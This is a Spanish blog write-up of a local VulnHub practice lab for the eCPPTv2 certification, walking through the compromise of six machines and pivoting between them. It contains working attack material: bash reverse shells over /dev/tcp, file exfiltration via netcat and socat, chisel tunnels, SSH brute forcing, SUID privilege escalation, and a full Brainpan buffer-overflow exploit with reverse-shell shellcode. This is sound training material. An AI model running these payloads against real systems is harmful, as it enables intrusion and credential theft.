---

title: Demo eCCPTv2
date: 2023-05-02 07:03 +0800
categories: [Certificaciones]
tags: [laboratorio, eCCPTv2, Certificaciones]
pin: true

---

Este es un laboratorio para practicar de cara a la certificación del eCCPTv2 fue realizado por [s4vitar](https://www.twitch.tv/s4vitaar) en su canal de twitch, [aquí](https://www.youtube.com/watch?v=Q7UeWILja-g) podeis ver el video completo de la simulación. 
Todo el laboratorio esta montado en local con ayuda de la plataforma de [vulnhub](https://www.vulnhub.com/). 

![Demo eCCPTv2]({{ 'assets/img/eCCPTv2/Demo_eCPPTv2.png' | relative_url }}){: .center-image }

# Descarga de máquinas
- [Aragog](https://www.vulnhub.com/?q=aragog)
- [Nagini](https://www.vulnhub.com/?q=nagini)
- [Fawkes](https://www.vulnhub.com/?q=fawkes)
- Dumbledore -> Instalaremos windows 7 vulnerable a enternalBlue.
- [Matrix](https://www.vulnhub.com/entry/matrix-1,259/)
- [Brainpan](https://www.vulnhub.com/entry/brainpan-1,51/)

# Configuración de máquinas
En el menú del boot de cada máquina pulsaremos "e" para entrar en modo de configuración. Tenemos que reemplazar _"ro quit"_ por _"rw init=/bin/bash"_ y guardar cambios con f10 o crtl+x. Esto nos lanzará una bash como root donde tenemos que configurar las interfaces.

Con **nano** editamos /etc/network/interfaces, reemplazamos con los siguientes datos y después reiniciaremos la máquina. 
```
auto ens33
allow-hotplug ens33
iface ens33 inet dhcp
auto ens34
allow-hotplug ens34
iface ens34 inet dhcp
```
---
# Configuración de VMware
En **VMware** tenemos que ir a `/edit/Virtual` _Network Manager_:
- Tenemos que activar _"change settings"_ así podemos añadir redes con _"add network"_ y en subnet poner el segmento de IP que queremos asignarle. 
![Configuración vmware]({{ "assets/img/vmware/VMnet_lab.png" | relative_url }})
- Incluir subredes necesarias a cada máquina para que todo el lab se comunique.

| Máquina       | Interface 1 | Interface 2 | 
|:--------------|:------------|:------------|
| Aragog        | Brigde      | VMnet 2     |             
| Nagini        | VMnet 2     | VMnet 3     |             
| Fawkes        | VMnet 3     |             |             
| Dumbledore    | VMnet 3     | VMnet 4     |             
| Matrix        | VMnet 4     | VMnet 5     |             
| Brainpan      | VMnet 5     |             |             

# Explotación de máquinas
## Aragog
- Tiene alojado un WP donde podemos realizar un RCE mediante el pluggins file manager.
	- Podemos sacar información de posibles vulnerabilidades con _WpScan_ , este nos reporta una ruta con un .py. El _.py_ nos permite subir un archivo .php en el cual podemos incluir el tipico _cmd.php_. Para después mandarnos un revshell.


``` bash
$> nc -nlvp 7771 # Atacante
$> http://192.168.50.248/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.50.202/7771%200%3E%261%22 # URL WEB
```
  -  _www-data_ accedemos con este usuario a la máquina. Buscando info  en archivos de configuración de wordpress "/usr/share/wordpress$ cat /etc/wordpress/config-default.php" encontramos user y pass para mysql. "root:mySecr3tPass".
	- Dentro de _mysql_ econtramos el hash "$P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc." para el user hagrid98, con john crackeamos la contraseña "password123"
	- Con _find_ vemos todos los archivos del user hagrid98, y nos encontramos un archivo en /opt/.back..... Tenemos permisos para modificar el archivo y este es ejecutado por root. Entonces agregamos al archivo "chmod u+s /bin/bash" 
	- Para más comodidad en el futuro, nos creamos un ssh-keygen en nuestra máquina y copiamos el .pub en el _"authorized_keys"_ de la máquina _Aragog._
	- **PWNED!**

### Pivoting Aragog Tunnel chisel
``` bash
$> scp chisel root@192.168.50.202:/tmp/chisel # Como tenemos authorized_key podemos copiarnos un archivo de esta forma.
$> sudo ./chisel server --reverse -p 1234 # ATACANTE: Creamos un server con chisel para despues mandarnos un puerto de otro equipo.
$> ./chisel client 192.168.50.202:1234 R:socks R:443:10.10.0.129:443/udp # VICTIMA: Nos conectamos a la ip y port del "sever_Chisel", y despues nos mandamos el port 80 del HOST que no alzancamos "10.10.0.129" a nuestro 80.
```

## Nigini
- Nos hemos creado el _tunel socks_ con chisel, ahora las aplicaciones que  usemos tenemos que hacerlas entrar en el tunerl para  poner ejecutarlar.
- Examples:
	- proxychains nmap .....
	- gobuster ... snif ... --proxy socks5:/\/127.0.0.1:1080
	- El navegador configuramos con foxyproxy una conexion de socks5 aputando al 127.0.0.1 y puerto 1080.
- Enumerando la web vemos un note.txt, que nos indica una ruta. Para ver la nueva ruta tenemos que reaizar una peticion mediante **"http3"**, para eso tenemos que instalar [esto](https://github.com/cloudflare/quiche). 
- Haciendo la petición con **"./http3-client \https://127.0.0.1"** vemos el contenido y nos indica otra ruta _"\http://10.10.0.129/internalResourceFeTcher.php"_. 
- Mediante el uso de la herramienta _"joomscan"_ enumeramos el joomla y encontramos un archivo .bak. Este contiene el nombre de un usuario sin contraseña.
- *Gopherus* es una herramienta que nos permite ver datos de un DB cuando existe un usuario sin contraseña. No encontramos nada, pero podemos realizar cambios en la DB. Entonces en este punto cambiamos  la contraseña al user "site_admin".
- Dentro de _joomla_ en /extensiones/template modificamos el template de error.php para  mediante _"system(CommandRevShell)"_ mandarnos la revshell.
- Pero no tenemos conexion directa con nuestra máquina de atacante. La idea es mandarnos la rev shell  a _"Aragog"_ y desde hay mediante socar redirecionar la rev shell a nuestra máquina atacante. **Pasos:**

	- _`system("bash -c 'bash -i >0 /dev/tcp/[ipAragog]/[PortListenSocat] 0>&1");`_ En el template de erro.php del joomla incluimos este comando.
	- _`socat TCP-LISTEN:[Port en error.php],fork TCP:192.168.50.202:443`_ Este comando en Aragog,  escucha la revshell de
 error.php y la redireciona a nuestra máquina de atacante.
	- _`nc -nlvp 443`_ Y finalmente en nuestra máquina escuchamos la redirección del socat. 

- Ganamos acceso _www-data_, encontramos un creds.txt y migramos al user snape.
- Aquí vemos que existe un SUID que es copia archivo como hermoine. Entonces en /tmp nos creamos y _"authorized_keys"_ y lo compiamos al .ssh de hermoine y nos conectamos por ssh.
- Encontramos un directorio .mozilla con datos, jason,key4.db,etc.
	- Pasos para descargar archivos en nuestra máquina:
		- _`cat < logins.json > /dev/tcp/10.10.0.128/4646`_ Esto desde Nagini.
		- _`socat TCP-LISTEN:4646,fork TCP:192.168.50.202/1215`_ Socat en Aragog
		- _`nc -nlvp 1215 > logins.json`_ Listen en nuestra máquina atacante

- Si disponemos de un archivo "key4o3.db" y "logins.json" mediante la herramienta _"firepwd"_ podemos ver datos en texto claro. Extraemos pass de root. 
- **PWNED!**

### Pivoting Nagini Tunnel chisel
Como tenemos que alcanzar un nuevo segmento de red la _"192.168.100.0"_ la idea es:
	- Mover el chisel cliente a *nagini* y para mandar el tunel a *Aragog*
	- Desde *Aragog* mediante "socat" redirecionar a nuestra máquina.
- **Command:**
```python
$> ./chisel client 10.10.0.128:2322 R:8888:socks # Nagini 
$> ./socat TCP-LISTEN:2322,fork TCP:192.168.50.202:1234 # Aragog
$> chisel server --reverse -p 1234 # Atacante, debemos cambiar tambien en "proxychains.conf" a "dinamic-chain" e incluir(más arriba) "socks5 127.0.0.1 8888"
$> sudo ssh root@192.168.50.248 -L 22:10.10.0.129:22 # POSIBLE ERROR, aplicamos un local port fordwarding
```

## Fawkes
- En el puerto 21 como anonymous encontramos un binario que a su vez esta alojado en la máquina por el puerto 9898, es un BoF.
- Es un [BoF](obsidian://open?vault=Obsidian_r4mnx&file=Vulns%2FBoF) que scripteamos y nos mandamos una revshell.
- Pero antes tenemos que crear un socat en la nagini y la Aragog, para poder recibir la shell en nuestro equipo.
- Ganamos acceso pero estamos en un contenedor. "sudo -l", y podemos ejecutar sudo /bin/sh y somos root en contenedor.
- Vemos en un archivo que se tramita una peticion por ftp cada minuto. Entonces nos podemos en escucha con tcpdump -i eth0 port ftp or ftp-data. Y vemos un user y contraseña.
- Migramos a "neville" por ssh con estas credenciales.
- Buscando SUID, encontramos el binario de sudo en su version "1.8.27" y esto es [vulnerable](https://www.exploit-db.com/exploits/47502) y usamos un [exploit](https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py).  Metemos persistencia "authorized_keys"
- **PWNED!**

## Dumbledore 
- Vulnerable a enternalBlue. Con el recurso [AutoBlue](https://github.com/d4t4s3c/Win7Blue) ejecutamos el .sh y nos ponemos en escucha por el puerto 443 _`rlwrap nc -nlvp 443`_ . 
- También se puede ganar acceso con "proxychains msfconsole" y con `execute -f chiselWIN.exe client 192.168.100.128:6543 R:9999:socks` mandamos
- Para mandarnos una revshell, vamos en primer lugar a subir nc64.exe al target. Pasos:
```python
$> sudo python3 smbserver.py smbfolder $(pwd) -smb2support # En máquina atacante
$> ./socat TCP-LISTEN:445,fork TCP:10.10.0.128:445 # En máquina Nagini
$> ./socat TCP-LISTEN:445,fork TCP:192.168.50.202:445 # En máquina Aragog
$> dir \\192.168.100.128\smbfolder\ # En Máquina Dumbledore lista recursos.
$> copy \\192.168.100.128\smbFolder\nc64.exe C:\\Windows\nc64.exe # Copiamos nc en Dumbledore
```
- Ahora la idea es entablar una shell interactiva con nc64.exe. 
```shell
$> nc64.exe -e cmd 192.168.50.202 4545 # En Dumbledore
$> rlwrap nc -nlvp 4545 # En ParrotOS
```
De esta forma tenemos una shell completamente interactiva.
- _Command Enum Matrix:_
```shell
$> for /L %a in (1,1,254) do @start /b ping 172.18.0.%a -w 100 -n 2 >nul # Hostdiscovery windows
$> arp -a # Vemos hosts
```
- **PWNED!**

### Pivoting  Dumbledore Tunnel chisel
```shell
$> ./socat TCP-LISTEN:6542,fork TCP:192.168.50.202:1234 # Aragog
$> ./socat TCP-LISTEN:6543,fork TCP:10.10.0.128:6542 # Nagini
$> ./chisel server -reverse -p 1234 # Atacante, seguimos con nuestro server de chisel inicial. Y debemos recibir una nueva conexión pot el port9999
$> chiselWIN.exe client 192.168.100.128:6543 R:9999:socks # Dumbledore, crearmos la conexión al server chisel
# /etc/proxychains.conf 
# Añadimos "socks5 127.0.0.1 9999"
```

## Matrix
- Encontramos algo interesante en el codigo de la WEB del puerto 31337, en el codigo vemos que existe un archivo Cypher.matrix y éste contiene lenguaje "brainfuck"
- En el archivo anterio vemos que nos indica una contraseña pero le falta dos caracteres "k1ll0rXX", con crunch podemos hacer un diccionario para completas la contraseña:
```shell
$> crunch 8 8 -t k1ll0r%@ > passwords
$> crunch 8 8 -t k1ll0r@% >> passwords
# Con esto indicamos que la contraseña tendrá un valor minimo y maximo de 8 caracteres, y % representa a numeros y @ a caracteres minuscula. Existen más como ^ o , etc.
```
- Ahora mediante hidra intentamos entrar por ssh a la máquina:
	- _`proxychains hydra -l guest -P passwords ssh://172.18.0.129 -t 20 2>/dev/null`_ con `-f` para cuando encuentra credenciales.
	- Encontramos guest:k1ll0r7n `proxychains ssh guest@172.18.0.129 bash` indicamos bash al final por que la conexión normal entraría en una retritic bash y así podemos escapar de ella.
	- La escalada es facil `sudo whoami` + `sudo su` con contraseña guest. 
	- Metemos persistencia con authorized_keys
	- **PWNED!**

### Pivoting  Matrix Tunnel chisel
```shell
$> ./socat TCP-LISTEN:8789,fork TCP:192.168.50.202:1234 # Aragog
$> ./socat TCP-LISTEN:8788,fork TCP:10.10.0.128:8789 # Nagini
$> netsh interface portproxy add v4tov4 listenport=8787 listenaddress=0.0.0.0 connectport=8788 connectaddress=192.168.100.128 # Dumbledore simil socat.
$> ./chisel client 172.18.0.128:8787 R:5522:socks
# /etc/proxychains.conf 
# Añadimos "socks5 127.0.0.1 5522"
```
Puede ser que no nos deje abrir ssh en Nagini, podemos hacer un `ssh root@[IP Aragog] -L 22:10.10.0.129:22` -> Ahora podemos acceder mediante `ssh root@localhost`

## Brainpan

- Descubrimos puerto 9999 y 10000.
- El port 10000 es una web que no podemos enumerar por que peta el gobuster. Mediante burp podemos realizar un escaneo mandando la petición al intruder y fuzzeando /$test$ por el directorio 2.3.medium. Se necesita cambiar en /opciones/network/conecctions:
 ![[socks5BURP.png]]
 Fuzzeamos desde el intruder de BURP. Encontramos la ruta _/bin_ y este nos descarga un brainpan.exe. En el puerto 9999 corre al parecer un programa y suponemos que este binario descargado será el del puerto 9999 y explotaremos el BoF en local.
 - Para este paso nos levantamos un windows7 32bits. E instalamos immunity debugger y mona. 
 - Con immDebugger attach al binario, por otro lado ejecutamos el binario y desde el parrot con "nc ip 9999" entablamos conexion. Si ponemos muchas A podemos en  funcioaniemto todo. 
 - **Immunity debugger:**
 ```shell
$> /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000 # Patron 1000 caracteres. Nos resulta 35724134 -> EIP. 
$> /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x35724134 # Esto nos idicará cuantos "A" hay antes de esta dirección del EIP, resultado "A*524"
$> python3 -c 'print("A"*524 + "B"*4 + "C"*200)' # Payload, con esto controlamos que el EIP es: 42424242 que es igual que el BBBB. Desde IDebugger en el campo del ESP/follow in dump/ podemos ver que lo anterior al 4343.... es 42424242, quiere decir que en nuestras C deben de ir reemplazadas por nuestro shellcode. 
# Ahora descargamos mona.py y lo incluimos en la vm de windows7_32 en donde instalamos el IDebugger \PyCommand. Ahora desde Idebugger escribiendo "!mona" nos arranca el .py, este .py es para generar un patron para controlar el ESP. 
# Ahora com mona vamos a generar un patron en Idebbuger:
	# Creamos carpeta Binary en desktop
	# !mona config -set workingfolder C:\Users\test\Desktop\Binary\%p -> Esto nos seteamos que el patron se guarde aqui
	# !mona bytearray -cpb "\x00" -> Aqui crea el patron sacando del array los NULL "x00"
$> sudo impacket-smbserver smbFolder $(pwd) -smb2support # En Parrot 
$> \\[IP Parrot] # Desde WIN7_32 en explorador y copiamos el bytearry.txt que nos genero con el code. ç
$> cat bytearray.txt | grep -oP '".*?"' | tail -n 8 # Con esto nos quedamos solo la data que nos interesa. 
# Ahora pasamos a scriptear el payload final en .py
```

- **Script Python**

```python
#!/usr/bin/python3

import socket
from struct import pack

offset = 524
before_eip = b"A" * offset
eip = pack("<I", 0x311712f3) # jmp ESP

shellcode = (b"\xda\xcf\xd9\x74\x24\xf4\xba\xca\x98\x76\x4c\x5b\x2b\xc9"
b"\xb1\x52\x31\x53\x17\x03\x53\x17\x83\x21\x64\x94\xb9\x49"
b"\x7d\xdb\x42\xb1\x7e\xbc\xcb\x54\x4f\xfc\xa8\x1d\xe0\xcc"
b"\xbb\x73\x0d\xa6\xee\x67\x86\xca\x26\x88\x2f\x60\x11\xa7"
b"\xb0\xd9\x61\xa6\x32\x20\xb6\x08\x0a\xeb\xcb\x49\x4b\x16"
b"\x21\x1b\x04\x5c\x94\x8b\x21\x28\x25\x20\x79\xbc\x2d\xd5"
b"\xca\xbf\x1c\x48\x40\xe6\xbe\x6b\x85\x92\xf6\x73\xca\x9f"
b"\x41\x08\x38\x6b\x50\xd8\x70\x94\xff\x25\xbd\x67\x01\x62"
b"\x7a\x98\x74\x9a\x78\x25\x8f\x59\x02\xf1\x1a\x79\xa4\x72"
b"\xbc\xa5\x54\x56\x5b\x2e\x5a\x13\x2f\x68\x7f\xa2\xfc\x03"
b"\x7b\x2f\x03\xc3\x0d\x6b\x20\xc7\x56\x2f\x49\x5e\x33\x9e"
b"\x76\x80\x9c\x7f\xd3\xcb\x31\x6b\x6e\x96\x5d\x58\x43\x28"
b"\x9e\xf6\xd4\x5b\xac\x59\x4f\xf3\x9c\x12\x49\x04\xe2\x08"
b"\x2d\x9a\x1d\xb3\x4e\xb3\xd9\xe7\x1e\xab\xc8\x87\xf4\x2b"
b"\xf4\x5d\x5a\x7b\x5a\x0e\x1b\x2b\x1a\xfe\xf3\x21\x95\x21"
b"\xe3\x4a\x7f\x4a\x8e\xb1\xe8\xb5\xe7\x8b\x22\x5d\xfa\xeb"
b"\xb7\xdc\x73\x0d\xdd\xf0\xd5\x86\x4a\x68\x7c\x5c\xea\x75"
b"\xaa\x19\x2c\xfd\x59\xde\xe3\xf6\x14\xcc\x94\xf6\x62\xae"
b"\x33\x08\x59\xc6\xd8\x9b\x06\x16\x96\x87\x90\x41\xff\x76"
b"\xe9\x07\xed\x21\x43\x35\xec\xb4\xac\xfd\x2b\x05\x32\xfc"
b"\xbe\x31\x10\xee\x06\xb9\x1c\x5a\xd7\xec\xca\x34\x91\x46"
b"\xbd\xee\x4b\x34\x17\x66\x0d\x76\xa8\xf0\x12\x53\x5e\x1c"
b"\xa2\x0a\x27\x23\x0b\xdb\xaf\x5c\x71\x7b\x4f\xb7\x31\x9b"
b"\xb2\x1d\x4c\x34\x6b\xf4\xed\x59\x8c\x23\x31\x64\x0f\xc1"
b"\xca\x93\x0f\xa0\xcf\xd8\x97\x59\xa2\x71\x72\x5d\x11\x71"
b"\x57")


payload = before_eip + eip + b"\x90"*16 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.50.50", 9999))
s.send(payload)
s.close()
```

Ya tenemos el .py, vamos a probarlo contra la win7 en local. Execute .exe + Idebugger .... Ejecutamos el .py y en los resultados del IDebugger en el ESP volvemos a ver con ESP/follow in dump/.

Ahora podemos comparar este resultado con el bytearray.bin que nos creó antes. Cuando excluimos los x00.
_`!mona compare -f [rutaCompleta"bytearray.bin"] -a 0x0022F930`_ -> esta es la dirección del ESP, si no nos aparece nada en bad chars, todos los chars son corrector. 
De no serlo tenemos que volver al `!mona bytearray -cpb "\x00"` e incluimos el bad char nuevo y volvemos a repetir el proceso.
- **SHELLCode**
```shell
$> msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.202 LPORT=443 --platform windows -a x86 -e x86/shikata_ga_nai -f c -b "\x00" EXITFUNC=thread # ShellCode para la revshell
```
 Ahora podemos buscar el _jmp ESP_ con `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` + jmp ESP vemos el opcode que ne minuscula y separado "ff e4" 
 De nuevo todo .exe + Idebugger y con:
 `!mona modules` -> vemos seguridad del binario. ASLROS Dll, etc.
 `!mona find -s "\xFF\xE4" -m brainpan.exe` -> esto nos descubre la dirección "jmp ESP - 0x311712f3" para completar nuestro .py 
 - Para comprobar, si creamos un breakpoint en IDebugger con f2 en la dirección FFE4 0x311712f y volvemos a ejecutar todo. Esto parará en el jmp ESP, y el EIP será diferente al ESP, pero al salir del BreakPoint el ESP y EIP serán el mismo. 
 - Hay que ajustar también o mas bien dejarle un tiempo antes de que se ejecute el shellcode, para eso metemos unos nops. 
 - Volvemos a ajustar el shellcode pero ahora con la maquina o nodo más cercano y s.connect(10.15.12.129...)
- Ahora lanzamos script.py a la maquina real y ganamos acceso a una unidad lógica Z:\. Esta máquina tiene algo montado que es linux y windows. Vamos a preparar otro shellcode para linux y lanzar otra vez el script.py. Command: _`msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.50.202 LPORT=1346 -f py -b "\x00" EXITFUNC=thread`_ 
- Tratamos la tty.  Ahora investigando la maquina, es linux. Pero la aplicación corre con wine "windows".
- Existe un "sudo -l" comando que podemos lanzar como sudo y es un programa que nos permite abrir manual entre otras opciones.
- La idea es abri el manual de whoami por ejemplo y al entrar en modo paginate, hay podemos lanzar un comando. Pasos:
```shell
$> sudo /home/anansi/bin/anansi_util manual whoami
$> !/bin/bash # Dentro del modo paginate.
```
- Para poder ejecutar comandos con el "NX disable" del binario en la maquina WIN7, podemos incluir este comando en el cmd `bcdedit /set  {current} nx AlwaysOFF` y reload PC de prueba local del binario. 
- **PWNED!**
